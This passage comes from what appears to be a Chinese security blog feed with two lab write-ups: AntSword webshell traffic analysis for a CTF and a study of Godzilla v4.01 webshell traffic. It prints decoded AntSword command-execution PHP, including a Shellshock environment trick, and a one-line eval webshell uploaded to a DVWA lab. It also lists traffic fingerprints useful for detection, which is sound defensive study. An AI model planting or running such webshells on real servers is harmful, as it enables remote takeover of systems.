&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			if (strstr(readlink(&amp;quot;/bin/sh&amp;quot;), &amp;quot;bash&amp;quot;) != FALSE) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				$tmp = tempnam(sys_get_temp_dir(), &amp;#x27;as&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				putenv(&amp;quot;PHP_LOL=() &amp;#123; x; &amp;#125;; $c &amp;gt;$tmp 2&amp;gt;&amp;amp;1&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				if (fe(&amp;#x27;error_log&amp;#x27;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					error_log(&amp;quot;a&amp;quot;, 1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					mail(&amp;quot;a@127.0.0.1&amp;quot;, &amp;quot;&amp;quot;, &amp;quot;&amp;quot;, &amp;quot;-bv&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				return False;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$output = @file_get_contents($tmp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			@unlink($tmp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			if ($output != &amp;quot;&amp;quot;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				print($output);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				return True;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return False;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	function runcmd($c) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$ret=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$d=dirname($_SERVER[&amp;quot;SCRIPT_FILENAME&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if(fe(&amp;#x27;system&amp;#x27;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			@system($c,$ret);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; elseif(fe(&amp;#x27;passthru&amp;#x27;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			@passthru($c,$ret);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; elseif(fe(&amp;#x27;shell_exec&amp;#x27;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			print(@shell_exec($c));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; elseif(fe(&amp;#x27;exec&amp;#x27;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			@exec($c,$o,$ret);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			print(join(&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;,$o));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; elseif(fe(&amp;#x27;popen&amp;#x27;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$fp=@popen($c,&amp;#x27;r&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			while(!@feof($fp)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				print(@fgets($fp,2048));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			@pclose($fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; elseif(fe(&amp;#x27;proc_open&amp;#x27;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$p = @proc_open($c, array(1 =&amp;gt; array(&amp;#x27;pipe&amp;#x27;, &amp;#x27;w&amp;#x27;), 2 =&amp;gt; array(&amp;#x27;pipe&amp;#x27;, &amp;#x27;w&amp;#x27;)), $io);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			while(!@feof($io[1])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				print(@fgets($io[1],2048));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			while(!@feof($io[2])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				print(@fgets($io[2],2048));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			@fclose($io[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			@fclose($io[2]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			@proc_close($p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; elseif(fe(&amp;#x27;antsystem&amp;#x27;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			@antsystem($c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; elseif(runshellshock($d, $c)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			return $ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; elseif(substr($d,0,1)!=&amp;quot;/&amp;quot; &amp;amp;&amp;amp; @class_exists(&amp;quot;COM&amp;quot;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$w=new COM(&amp;#x27;WScript.shell&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$e=$w-&amp;gt;exec($c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$so=$e-&amp;gt;StdOut();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$ret.=$so-&amp;gt;ReadAll();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$se=$e-&amp;gt;StdErr();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$ret.=$se-&amp;gt;ReadAll();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			print($ret);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$ret = 127;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return $ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$ret=@runcmd($r.&amp;quot; 2&amp;gt;&amp;amp;1&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	print ($ret!=0)?&amp;quot;ret=&amp;#123;$ret&amp;#125;&amp;quot;:&amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;catch(Exception $e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo &amp;quot;ERROR://&amp;quot;.$e-&amp;gt;getMessage();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;asoutput();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;die();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当查看这一串的 base64 解码的内容时&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这串内容可能出现在整体代码的前面，也可能能出现在整体代码的后端&lt;br&gt;
尝试了几次，发现是这样的，但是具体原因还不太清楚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hdQWdF5Rrl5BEMAR.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;能发现我们之前输入的最后一行 cat flag.php 命令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/e5o5xZjl0cwyKaJ3.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据这个再去 http 流的最后一个追踪流&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ItR2SF2XaVYginww.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;解码这段 base64 就能看到 cat flag.php 的具体内容了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ATJitJGKzlDQFCbK.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://nnnpc.github.io/2024/04/16/%E5%93%A5%E6%96%AF%E6%8B%89v4.01%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/</guid>
            <title>哥斯拉v4.01流量浅析</title>
            <link>https://nnnpc.github.io/2024/04/16/%E5%93%A5%E6%96%AF%E6%8B%89v4.01%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/</link>
            <category>流量</category>
            <pubDate>Tue, 16 Apr 2024 13:58:19 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;前段时间稍微看了下哥斯拉的一些流量相关的知识点，今天就来稍微记录一下&lt;/p&gt;
&lt;p&gt;首先我就在 NSSCTF 平台开了一个 DVWA 的靶场，用文件上传来进行说明，首先先进行哥斯拉的常规使用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tYwSyXaBAubhQ2aj.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在哥斯拉左上角点击管理 -&amp;gt; 生成&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/trsNIZqYtmGpWpWq.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在如下的两个地方选择载荷和加密器，这里就选择 php 的 eval_xor_base64&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4T7VyxuaX0P0dyju.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击生成&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval($_POST[&amp;quot;pass&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;会发现是最普通的一句话木马，接着由于靶场的最低级的限制，直接上传 php 文件&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1nWr1HheRSV0yqLd.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;在哥斯拉左上角点击目标添加&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/miphcOVjEc0gIKEg.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 URL 处填写好木马存放的位置，并将有效载荷和加密器调整为木马所对应的种类，测试连接为 success 即可添加&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TIsUGlkMcq1lhJSu.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着右键进入，就能够找到如下的命令执行界面了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nTgTAk3t7gdzh5PS.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;基本的使用介绍完了，接下来就自己抓取流量来进行分析&lt;/p&gt;
&lt;p&gt;使用 wireshark 进行捕获&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sp0Dnl5fE8s5wP6Z.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用 ls 和 ls / 两条命令来进行测试&lt;/p&gt;
&lt;p&gt;首先在 tcp 流 13 发现了哥斯拉的特征流&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kICWJZ8g22hWD5EP.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;借着该流来分析一下哥斯拉的流量特征&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Cookie&lt;br&gt;
 这是一个强特征，在请求包 cookie 中有一个非常明显的就是末尾带分号&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sol2NjTPk0is6yDj.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Accept&lt;br&gt;
 算一个弱特征，与之前出现过的冰蝎相似，上网搜了一下，发现其实这个也是 JDK 引入的一个特征，并不是作者自定义的 Accept&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6rVe3Oi3o4syVQu4.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;响应体&lt;br&gt;
这个可以算是特征比较明显的一个点了，从代码可以看到它是把一串 32 位的 md5 字符串等量拆分后分别放在 base64 编码的前后。总体的结构便为：前 16 位 md5+base64 编码 + 后 16 位 md5&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V9vRwHft8bC2CEJ7.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来解密一下流量看看&lt;/p&gt;
&lt;p&gt;这里使用的解密脚本是 github 上的一个 python 脚本&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3dlYnJheWJ0bC93ZWJzaGVsbF9kZXRlY3Q=&#34;&gt;https://github.com/webraybtl/webshell_detect&lt;/span&gt;&lt;br&gt;
 之前我们使用的加密体是 php_eval_xor_base64，因此请求体的构成为明文可执行代码 + 加密数据，在脚本内找到对应的解密模块&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span 